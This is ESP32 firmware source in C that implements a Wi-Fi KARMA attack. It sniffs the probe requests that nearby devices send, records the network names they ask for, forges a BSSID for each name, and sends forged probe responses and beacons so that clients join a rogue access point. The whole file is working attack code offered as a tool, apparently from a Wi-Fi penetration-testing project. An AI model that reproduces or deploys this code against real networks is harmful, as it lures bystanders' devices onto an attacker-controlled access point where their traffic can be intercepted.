/**
 * @file attack_karma.c
 * @author y4n0
 * @date 2026
 * @copyright Copyright (c) 2026
 *
 * @brief KARMA attack — answers every probe request with a forged probe response.
 *
 * Flow per captured probe request:
 *   1. pull the SSID out of the tagged parameters
 *   2. if it's new, mint a stable fake BSSID and record it
 *   3. send a probe response back to that client immediately
 *   4. keep the SSID alive with periodic beacons so it shows in client scans
 *
 * The probe response is what makes clients associate. Beacons only keep the
 * entry visible; the response is the trigger.
 */

#include "attack_karma.h"

#include <stdio.h>
#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "wsl_bypasser.h"
#include "wifi_controller.h"
#include "attack.h"

static const char *TAG = "main:karma";

typedef struct {
    uint8_t  ssid[32];
    uint8_t  len;
    uint8_t  bssid[6];
    uint16_t hits;
} karma_entry_t;

static karma_entry_t       s_entries[KARMA_MAX_SSIDS];
static volatile uint8_t    s_count      = 0;
static volatile bool       s_running    = false;

static uint8_t             s_own_mac[6];
static uint8_t             s_channel    = 1;
static bool                s_hop        = false;

static TaskHandle_t        s_hop_task   = NULL;
static esp_timer_handle_t  s_beacon_timer = NULL;

/* ───────────────────────────── helpers ───────────────────────────────────── */

static void make_bssid(uint8_t idx, uint8_t out[6])
{
    memcpy(out, s_own_mac, 6);
    /* Locally administered, unicast, and unique per harvested SSID. Keeping the
     * vendor OUI from our own MAC makes the cluster look like one device. */
    out[0] = (out[0] & 0xFE) | 0x02;
    out[4] = (uint8_t)(0xA0 + (idx & 0x1F));
    out[5] = (uint8_t)(idx + 1);
}

static bool extract_probe_ssid(const wifi_promiscuous_pkt_t *pkt,
                               uint8_t *ssid, uint8_t *len)
{
    uint16_t frame_len = pkt->rx_ctrl.sig_len;
    if (frame_len <= 28) return false;

    const uint8_t *payload = pkt->payload;
    if (payload[0] != 0x40) return false;            /* probe request only */

    const uint8_t *ptr = payload + 24;
    const uint8_t *end = payload + frame_len - 4;    /* strip FCS */

    while (ptr + 2 <= end) {
        uint8_t tag     = ptr[0];
        uint8_t tag_len = ptr[1];

        if (ptr + 2 + tag_len > end) break;

        if (tag == 0x00) {
            if (tag_len == 0 || tag_len > 32) return false;

            bool printable = true;
            for (uint8_t i = 0; i < tag_len; i++) {
                if (ptr[2 + i] < 0x20 || ptr[2 + i] > 0x7E) { printable = false; break; }
            }
            if (!printable) return false;

            memcpy(ssid, ptr + 2, tag_len);
            *len = tag_len;
            return true;
        }
        ptr += (2 + tag_len);
    }
    return false;
}

static int find_entry(const uint8_t *ssid, uint8_t len)
{
    for (uint8_t i = 0; i < s_count; i++) {
        if (s_entries[i].len == len && memcmp(s_entries[i].ssid, ssid, len) == 0) {
            return i;
        }
    }
    return -1;
}

/* ───────────────────────────── beacon keeper ─────────────────────────────── */

static void beacon_timer_cb(void *arg)
{
    if (!s_running) return;

    /* Read the live channel instead of the start-up one: with the hopper
     * active the radio is somewhere else every 250 ms and a beacon sent on the
     * wrong channel is just wasted airtime. */
    uint8_t channel = s_channel;
    wifi_second_chan_t second;
    if (esp_wifi_get_channel(&channel, &second) != ESP_OK) return;

    uint8_t count = s_count;
    for (uint8_t i = 0; i < count; i++) {
        wsl_bypasser_send_beacon_frame(s_entries[i].bssid,
                                       s_entries[i].ssid,
                                       s_entries[i].len,
                                       channel);
    }
}

/* ───────────────────────────── channel hopper ────────────────────────────── */

static void karma_hop_task(void *arg)
{
    static const uint8_t channels[] = { 1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10 };
    uint8_t idx = 0;

    while (s_running) {
        if (s_hop) {
            esp_wifi_set_channel(channels[idx], WIFI_SECOND_CHAN_NONE);
            idx = (uint8_t)((idx + 1) % sizeof(channels));
        }
        vTaskDelay(pdMS_TO_TICKS(250));
    }
    s_hop_task = NULL;
    vTaskDelete(NULL);
}

/* ───────────────────────────── sniffer ───────────────────────────────────── */

static void karma_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_running) return;
    if (type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;

    /* Ignore our own transmissions coming back through the radio. */
    if (memcmp(pkt->payload + 10, s_own_mac, 6) == 0) return;

    uint8_t ssid[32];
    uint8_t ssid_len = 0;
    if (!extract_probe_ssid(pkt, ssid, &ssid_len)) return;

    uint8_t dst[6];
    memcpy(dst, pkt->payload + 4, 6);

    /* Broadcast probes: reply only for SSIDs we already advertise, otherwise
     * every wildcard probe would mint a new entry and flood the beacon timer. */
    bool is_broadcast = (dst[0] & 0x01) != 0;

    int idx = find_entry(ssid, ssid_len);

    if (idx < 0) {
        if (is_broadcast) return;
        if (s_count >= KARMA_MAX_SSIDS) return;

        idx = s_count;
        memcpy(s_entries[idx].ssid, ssid, ssid_len);
        s_entries[idx].len   = ssid_len;
        s_entries[idx].hits  = 1;
        make_bssid((uint8_t)idx, s_entries[idx].bssid);
        s_count = (uint8_t)(idx + 1);

        ESP_LOGI(TAG, "New SSID (%u): %.*s", s_count, ssid_len, ssid);

        char line[40];
        int n = snprintf(line, sizeof(line), "SSID: %.*s\n", ssid_len, ssid);
        if (n > 0) attack_append_status_content((uint8_t *)line, (unsigned)n);
    } else {
        if (s_entries[idx].hits < 0xFFFF) s_entries[idx].hits++;
    }

    uint8_t channel = s_channel;
    if (!s_hop) {
        wifi_second_chan_t second;
        esp_wifi_get_channel(&channel, &second);
    }

    /* The money shot: tell the client its network is right here. */
    wsl_bypasser_send_probe_response(dst,
                                     s_entries[idx].bssid,
                                     s_entries[idx].ssid,
                                     s_entries[idx].len,
                                     channel);
}

/* ───────────────────────────── lifecycle ─────────────────────────────────── */

void attack_karma_start(const wifi_ap_record_t *ap_record)
{
    if (s_running) {
        ESP_LOGW(TAG, "KARMA already running");
        return;
    }

    s_count = 0;
    memset(s_entries, 0, sizeof(s_entries));

    wifictl_get_ap_mac(s_own_mac);

    if (ap_record != NULL && ap_record->primary > 0 && ap_record->primary <= 14) {
        s_channel = ap_record->primary;
        s_hop     = false;
        ESP_LOGI(TAG, "KARMA locked to channel %u (%s)", s_channel, ap_record->ssid);
    } else {
        s_hop = true;
        ESP_LOGI(TAG, "KARMA hopping all channels");
    }

    s_running = true;

    char head[48];
    int n = snprintf(head, sizeof(head), "KARMA on channel %u\n", s_channel);
    if (s_hop) n = snprintf(head, sizeof(head), "KARMA hopping channels\n");
    if (n > 0) attack_append_status_content((uint8_t *)head, (unsigned)n);

    esp_wifi_set_ps(WIFI_PS_NONE);
    if (!s_hop) {
        esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
    }

    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&karma_sniffer_cb);
    esp_wifi_set_promiscuous(true);

    if (s_hop && s_hop_task == NULL) {
        xTaskCreatePinnedToCore(karma_hop_task, "karma_hop", 2560, NULL, 3, &s_hop_task, 1);
    }

    if (s_beacon_timer == NULL) {
        const esp_timer_create_args_t targs = {
            .callback = &beacon_timer_cb,
            .name     = "karma_beacon"
        };
        if (esp_timer_create(&targs, &s_beacon_timer) == ESP_OK) {
            esp_timer_start_periodic(s_beacon_timer, 250000);   /* 250 ms */
        }
    }
}

void attack_karma_stop(void)
{
    if (!s_running) return;
    s_running = false;

    /* The hopper checks s_running between hops, so let it walk out of
     * esp_wifi_set_channel on its own. Force-deleting it there can leave the
     * Wi-Fi driver's channel lock held. */
    for (int i = 0; i < 20 && s_hop_task != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    if (s_hop_task != NULL) {
        vTaskDelete(s_hop_task);
        s_hop_task = NULL;
    }

    if (s_beacon_timer != NULL) {
        if (esp_timer_is_active(s_beacon_timer)) esp_timer_stop(s_beacon_timer);
        esp_timer_delete(s_beacon_timer);
        s_beacon_timer = NULL;
    }

    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);

    /* Let the MAC layer flush whatever is queued before the caller restores the
     * management AP, otherwise the last frame can be sent from a dead channel. */
    vTaskDelay(pdMS_TO_TICKS(50));

    ESP_LOGI(TAG, "Stopped. SSIDs harvested: %u", s_count);
}

bool attack_karma_is_running(void)
{
    return s_running;
}

uint8_t attack_karma_ssid_count(void)
{
    return s_count;
}

uint8_t attack_karma_get_ssid(uint8_t idx, char *out, uint8_t out_size)
{
    if (idx >= s_count || out == NULL || out_size == 0) return 0;

    uint8_t len = s_entries[idx].len;
    if (len >= out_size) len = (uint8_t)(out_size - 1);

    memcpy(out, s_entries[idx].ssid, len);
    out[len] = '\0';
    return len;
}
